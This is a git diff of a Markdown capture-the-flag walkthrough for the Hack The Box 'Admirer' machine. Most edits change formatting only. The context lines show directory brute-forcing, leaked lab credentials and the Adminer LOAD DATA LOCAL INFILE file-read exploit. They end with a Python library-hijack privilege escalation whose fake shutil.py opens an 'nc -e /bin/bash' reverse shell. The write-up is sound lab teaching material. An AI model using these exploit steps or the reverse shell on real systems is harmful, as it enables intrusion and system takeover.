@@ -1,11 +1,7 @@
 ![](admirer-banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
-
-||
-|-----------|
-|Start with the nmap web server on port 80 and `/admin-dir` a directory path in the robots.txt file and a potential username __waldo__. bruteforcing inside admin-dir found two txt files. from one of these files get the working __FTP account__ creds. From the FTP server got some web_server backup files and from these files i determines that there is a directory path `utility-scripts` on the server. bruteforcing form this directory found __Adminer login panel__ and after some googling found that the running adminer version is vulnerable for file discloser vulnerability and using that vulnerability got the user waldo's __ssh__ password and get the __user flag__. User waldo have some sudo rights and can run some python scripts as root and here i use the __python library hijacking__ exploit to esclate to root user and get __root_flag__.|
 
 # Scanning
 
@@ -31,14 +27,14 @@ PORT   STATE SERVICE VERSION
 	  This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
 	  Disallow: /admin-dir
 
-    - potential username __waldo__
+    - potential username **waldo**
 
 - /admin-dir
 
 	  forbidden - permission denied
 
 ## Gobuster 
->__*/admin-dir/*__
+>**_/admin-dir/_**
 
 `gobuster dir -u http://10.10.10.187/admin-dir/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php -t 50`
 ```
@@ -59,11 +55,11 @@ PORT   STATE SERVICE VERSION
 
 - `credentials.txt` contains some creds
 
-	__[FTP account]__ `ftpuser:%n?4Wz}R$tTF7`
+	**[FTP account]** `ftpuser:%n?4Wz}R$tTF7`
 
-	__[Wordpress account]__ `admin:w0rdpr3ss01!`
+	**[Wordpress account]** `admin:w0rdpr3ss01!`
 
-	__[Internal mail account]__ `w.cooper@admirer.htb:fgJr6q#S\W:$P`
+	**[Internal mail account]** `w.cooper@admirer.htb:fgJr6q#S\W:$P`
 
   - found working `FTP` creds
 
@@ -81,8 +77,8 @@ PORT   STATE SERVICE VERSION
 dump.sql  html.tar.gz
 ```
 
-- __`dump.sql`__ *holds the table of images and text shown on the main page.*
-- __`html.tar.gz`__ *holds the source for the webpage.*
+- **`dump.sql`** *holds the table of images and text shown on the main page.*
+- **`html.tar.gz`** *holds the source for the webpage.*
 
 	`tar -tf html.tar.gz`
 
@@ -118,7 +114,7 @@ dump.sql  html.tar.gz
   - but not working. There is a new web directory `utility-scripts`
 
 ## Gobuster 
->__*/utility-scripts/*__
+>**_/utility-scripts/_**
 
 `gobuster dir --url http://10.10.10.187/utility-scripts/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt -t 50`
 ```
@@ -128,15 +124,15 @@ dump.sql  html.tar.gz
 ### /adminer.php
 >Browsing `http://10.10.10.187/utility-scripts/adminer.php`
 
-__*Found*__
+**_Found_**
 
 - Adminer login panel
 - `version 4.6.2`
 
 #### Google
-__search :__ `adminer`
+**search :** `adminer`
 
-__*search results*__
+**_search results_**
 
 * [Adminer](https://www.adminer.org/) is a Database management tool for MYSQL
 * version 4.6.2 and above <4.7.0 have Serious Vulnerability,
@@ -144,9 +140,9 @@ __*search results*__
 * Vulnerability first discovered by security researchers Yashar Shahinzadeh,
 	[yashar medium blog](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)
 * How this Vulnerability works
-    * __First__, the attacker will access the victim’s Adminer instance, but instead of trying to connect to thevictim’s MySQL database, they connect “back” to their own MySQL database hosted on their own server.
+    * **First**, the attacker will access the victim’s Adminer instance, but instead of trying to connect to thevictim’s MySQL database, they connect “back” to their own MySQL database hosted on their own server.
 
-    * __Second__, using the victim’s Adminer (connected to their own database) – they use the MySQL command specifying a local file on the victim’s server. This command is used to load data from a file local to the Adminer instance, into a database.
+    * **Second**, using the victim’s Adminer (connected to their own database) – they use the MySQL command specifying a local file on the victim’s server. This command is used to load data from a file local to the Adminer instance, into a database.
 	  *sql command for loading file from Adminer instance
 
 		  LOAD DATA LOCAL INFILE '/etc/passwd' 
@@ -157,7 +153,7 @@ __*search results*__
 
 ## sql
 
-* __First__, setup mysql server in my local machine
+* **First**, setup mysql server in my local machine
 
 	  $ sudo service mysql start	//start mysql service
 	  $ sudo mysql -u root	//login as root user in our sql server
@@ -169,18 +165,18 @@ __*search results*__
 	  > FLUSH PRIVILEGES;
 	  > create table test (data VARCHAR(225)); //create test data in the created database
 
-* __Second__ , bind server to `tun0` address by editing cnf file
+* **Second** , bind server to `tun0` address by editing cnf file
 
 	  nano /etc/mysql/mariadb.conf.d/50-server.cnf
 		bind-address  = 0.0.0.0		//change bind address to tun0 or 0.0.0.0 
 
-* __Third__, restart mysql service
+* **Third**, restart mysql service
 
 	  $ sudo service mysql restart
 	  $ mysql -h localhost -u luser -p 	//testing created user
 		> lpass		//password
 
-* __Fourth__, login to adminer and connect back to my local sql server
+* **Fourth**, login to adminer and connect back to my local sql server
 
 	  System = MySQL
 	  Server = tun0
@@ -188,7 +184,7 @@ __*search results*__
 	  Password = lpass
 	  Database = ladmirer
 
-* __Fifth__, dump remote server database by running this command from `SQL Command` terminal in adminer
+* **Fifth**, dump remote server database by running this command from `SQL Command` terminal in adminer
 
 	  load data local infile '/var/www/html/index.php'
 	  into table test
@@ -198,11 +194,11 @@ __*search results*__
 
 > reading `/var/www/html/index.php` dump 123 rows*
 
-* __Sixth__, read dumped `adminer.php` file in SQL command terminal in adminer
+* **Sixth**, read dumped `adminer.php` file in SQL command terminal in adminer
 
 	  SELECT * from ladmirer.test;
 	
-	__*intresting data inside dump*__
+	**_intresting data inside dump_**
 
 	  $servername = \"localhost\";
 	  $username = \"waldo\";
@@ -224,7 +220,7 @@ __*search results*__
 	  User waldo may run the following commands on admirer:
 	      (ALL) SETENV: /opt/scripts/admin_tasks.sh
 
-	__*what i have here*__
+	**_what i have here_**
 	* i can set environment variables for `/opt/scripts/admin_tasks.sh`
 	* i can run `/opt/scripts/admin_tasks.sh` as root
 
@@ -251,7 +247,7 @@ __*search results*__
 
 		  from shutil import make_archive
 
-	__These looks suspicious__
+	**These looks suspicious**
 	* script itself not vulnerable
 	* script `admin_tasks.sh` calling `backup.py` in 6th `backup_web()` option.
 	* script `backup.py` importing shutil library
@@ -265,14 +261,14 @@ __*search results*__
 
 # Root Privesc 
 
-* __Frist__, create dummy `shutil.py` file with reverse shell in it.
+* **Frist**, create dummy `shutil.py` file with reverse shell in it.
 
 	  import os
 	  def make_archive(x, y, z):
 		  os.system("nc tun0 4141 -e '/bin/bash'")
 
-* __Second__, start netcat listener
-* __Third__, run `admin_tasks.sh` script, 
+* **Second**, start netcat listener
+* **Third**, run `admin_tasks.sh` script, 
 
 	  waldo@admirer:~$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6
 
